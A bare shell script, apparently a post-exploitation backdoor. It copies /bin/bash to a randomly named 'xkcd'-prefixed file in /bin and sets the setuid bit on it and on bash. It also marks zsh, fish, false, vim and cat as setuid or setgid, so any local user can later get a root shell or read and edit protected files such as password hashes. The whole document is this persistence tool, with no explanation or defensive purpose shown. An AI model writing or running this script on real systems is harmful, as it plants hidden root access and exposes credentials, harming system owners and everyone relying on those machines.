#!/bin/sh
randVar=$(cat /dev/urandom | head -c 6 | base64 -w0 | tr -d "+" | tr -d "/")
randVar="xkcd$randVar"
if [ -f /bin/bash ]; then
  cp -f /bin/bash /bin/$randVar
  chmod u+s /bin/bash /bin/$randVar
fi
if [ -f /bin/zsh ]; then
  chmod u+s /bin/zsh 
fi
if [ -f /bin/fish ]; then
  chmod u+s /bin/fish 
fi
if [ -f /bin/false ]; then
  chmod u+s /bin/false 
fi
if [ -f /usr/bin/vim ]; then
  chmod +s /usr/bin/vim
fi
if [ -f /bin/cat ]; then
  chmod +s /bin/cat
fi
